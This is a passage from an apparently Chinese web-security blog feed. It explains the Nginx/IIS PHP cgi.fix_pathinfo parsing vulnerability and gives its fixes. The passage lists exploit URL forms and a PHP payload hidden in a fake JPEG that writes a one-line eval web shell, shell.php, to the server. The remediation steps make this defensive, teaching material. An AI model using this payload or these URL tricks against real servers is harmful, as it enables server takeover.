<h2 id="三-Nginx-lt-8-03畸形解析漏洞"><a href="#三-Nginx-lt-8-03畸形解析漏洞" class="headerlink" title="三.Nginx &lt; 8.03畸形解析漏洞"></a>三.Nginx &lt; 8.03畸形解析漏洞</h2><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：<br>PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了</p>
<h3 id="漏洞形式-1"><a href="#漏洞形式-1" class="headerlink" title="漏洞形式"></a>漏洞形式</h3><p>www.xxxx.com/UploadFiles/image/1.jpg/1.php<br>www.xxxx.com/UploadFiles/image/1.jpg%00.php<br>www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php</p>
<p>另外一种手法：上传一个名字为test.jpg，以下内容的文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?PHP fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[cmd])?&gt;</div></pre></td></tr></table></figure></p>
<p>然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php。</p>
<h3 id="修复方案-2"><a href="#修复方案-2" class="headerlink" title="修复方案"></a>修复方案</h3><p>1.修改php.ini文件，将cgi.fix_pathinfo的值设置为0;<br>2.在Nginx配置文件中添加以下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">if ( $fastcgi_script_name ~ ..*/.*php ) &#123;</div><div class="line"></div><div class="line">　　 return 403;</div><div class="line">　　 &#125;</div></pre></td></tr></table></figure></p>
<p>这行代码的意思是当匹配到类似test.jpg/a.php的URL时，将返回403错误代码。<br>3.升级Nignx到最新版</p>
<h2 id="四-IIS7-5解析漏洞"><a href="#四-IIS7-5解析漏洞" class="headerlink" title="四.IIS7.5解析漏洞"></a>四.IIS7.5解析漏洞</h2><p>IIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了cgi.fix_pathinfo，而这并不是nginx或者iis7.5本身的漏洞。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;服务器解析漏洞已经是一个老生常谈问题了，但是有些服务器依然存在，这里复习记录一下常见服务器解析漏洞，比如IIS6.0，IIS7.5，acache，nginx解析漏洞。&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://y-hkl.top/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="服务器解析漏洞" scheme="http://y-hkl.top/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
</feed>
